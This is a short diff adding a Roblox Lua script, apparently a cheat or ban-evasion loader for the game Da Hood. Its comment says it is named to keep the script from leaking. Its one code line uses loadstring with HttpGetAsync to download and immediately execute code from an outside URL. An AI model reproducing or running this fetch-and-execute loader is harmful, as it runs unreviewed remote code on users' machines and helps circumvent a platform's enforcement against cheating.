@@ -1,0 +1,3 @@
+-- Its named this way so the script does not get leaked
+-- 오래 산다
+loadstring(game:HttpGetAsync("https://7n7o.com/dahood/unban.lua"))()
